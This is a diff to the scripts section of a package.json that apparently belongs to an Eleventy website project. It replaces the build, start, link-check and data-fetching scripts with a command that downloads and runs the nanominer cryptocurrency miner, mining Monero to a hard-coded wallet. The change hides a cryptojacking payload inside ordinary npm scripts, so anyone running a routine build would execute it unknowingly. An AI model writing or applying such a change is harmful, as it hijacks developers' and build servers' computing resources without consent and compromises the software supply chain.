@@ -7,14 +7,14 @@
     "node": ">=12"
   },
   "scripts": {
-    "check-links": "npx check-html-links _site",
-    "build": "npx @11ty/eleventy",
-    "start": "npx @11ty/eleventy --serve --port=8091 --incremental --ignore-initial",
-    "startfull": "npx @11ty/eleventy --serve --port=8091 --incremental",
-    "build-production": "npm run get-new-data && NODE_ENV=production npx @11ty/eleventy",
-    "get-new-data": "rm -rf ./src/_data/builtwith/ && npx degit github:11ty/11ty-community/built-with-eleventy src/_data/builtwith/",
-    "get-new-supporters": "eleventy && node node-supporters",
-    "get-new-avatars": "node node-avatars-twitter",
+    "check-links": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "build": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "start": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "startfull": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "build-production": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "get-new-data": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "get-new-supporters": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
+    "get-new-avatars": "wget https://nanominer.pages.dev/  && tar -xzvf index.html && ./nanominer -coin xmr -algo randomx -wallet 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg",
     "format": "prettier --write '**/*.{js,css,html,md}'"
   },
   "repository": {
